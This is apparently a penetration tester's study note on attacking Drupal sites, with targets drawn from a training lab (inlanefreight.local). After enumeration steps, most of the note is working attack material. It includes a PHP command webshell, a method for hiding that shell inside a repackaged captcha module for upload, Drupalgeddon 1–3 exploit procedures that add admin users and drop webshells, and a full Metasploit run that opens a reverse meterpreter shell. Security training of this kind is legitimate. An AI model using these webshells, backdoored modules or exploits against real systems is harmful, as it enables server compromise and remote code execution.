---
aliases:
tags:
source:
  - https://new.drupal.org/home
desc:
---
- written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. 
- https://websitebuilder.org/blog/drupal-statistics/

# discovery
- check for refrences to drupal ``
	- `curl -s http://drupal.inlanefreight.local | grep Drupal`
- drupal uses [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes) for its content. Nodes can be an article or a poll or a blog post.
	- `/node/<nodeid>`
	- `curl -s http://drupal.inlanefreight.local/node/1`
- three user types
	- **Administrator**: This user has complete control over the Drupal website.
	- **Authenticated** User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
	- **Anonymous**: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

# enumerate
- check version, installed plugins, etc in  `CHANGELOG.txt` and `README.txt`
	- `curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""`
	- `curl -s http://drupal-acc.inlanefreight.local/README.txt | grep -m2 ""`
	- ! newer versions of drupal block requests to these files
- [[droopescan]]
	- install `sudo pip3 install droopescan`
	- `droopescan scan drupal -u http://drupal.inlanefreight.local --enumerate v`
		- `--enumerate v` is for version only


# attack

- if you cannot enter php code got to CONFIGURATION -> Text Formats -> PHP Code
  ![[assets/attachments/kb/tools/jenkins/image.png]]

- before version 8
	- ! log in as admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated."
	  ![[drupal_php_module-20251123142531903.png]]
	- Save configuration
	- Add Content -> Basic Page 
		```php
		<?php
			system($_GET['cmd']);
		?>
		
	```
	  ![[basic_page_shell_7v2-20251116143438359.png]]
	- `curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"`
  - after version 8
	  - the php filter is not installed by default. 
	  - install (if required and approved by client)
		  - download `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
		  - in webui Administration > Reports > Available updates
			  - ![[install_module-20251116144703438.png]]
  - via modified module
	  - choose and download a module like https://www.drupal.org/project/captcha
		  - `wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
	  - extract
		- `tar xvf captcha-8.x-1.2.tar.gz`
	- create a .htaccess file to give ourselves access to the directory
	  ```php
		<IfModule mod_rewrite.c>
			RewriteEngine On
			RewriteBase /
		</IfModule>
	  ```
  - create a simple web shell in php
    ```php
    <?php
		system($_GET['cmd']);
	?>
   ```
   - move the files to the capture folder
	   - `mv shell.php .htaccess captcha`
   - recreate the archive
	   - `tar cvf captcha.tar.gz captcha/`
   - Upload via the Manage -> Extend -> Install New Module button
	   - possilbly this url `http://drupal.inlanefreight.local/admin/modules/install`
   - Execute the webshel
	   - `curl -s drupal.inlanefreight.local/modules/captcha/shell.php?cmd=id`
   - 
 
# exploits

## Drupalgeddon

- versions 7.0 up to 7.31
- https://www.drupal.org/SA-CORE-2014-005
- this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user
- exploit - https://www.exploit-db.com/exploits/34992
- [[Drupal 7.0  7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)]]
- requires python2.7
- help `python2.7 drupalgeddon.py`
- add admin user
	- `python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd`
	- get RCE via attack methods
- metasploit module - https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/

## Drupalgeddon2

- https://www.drupal.org/sa-core-2018-002
- is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. 
- The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected
- check if vulnerable
	- [[Drupal  8.3.9   8.4.6   8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)]]
	- execute `python3 drupalgeddon2.py`
	- check for hello.txt file `curl -s http://drupal-dev.inlanefreight.local/hello.txt`
	- create base64 encoded php web shell
		- `echo '<?php system($_GET[cmd]);?>' | base64`
	- replace `'echo ";-)" | tee hello.txt'` in drupalgeddon2.py file with
		- ` echo "base64encodedstringfromabove" | base64 -d | tee exploit.php`
	- execute `python3 drupalgeddon2.py`
	- confirm rce `curl http://drupal-dev.inlanefreight.local/exploit.php?cmd=id`

## Drupalgeddon3

- is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core
	- >=7.0 <7.59 
	- >= 8.0.0 <8.4.8 
	- >=8.5.0 <8.5.3
- it allows a user to have the ability to delete a node
- metasploit
	- after logging in, get session cookie 
- `exploit/multi/http/drupal_drupageddon3`
  ```sh
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec

msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)


meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux

  ```

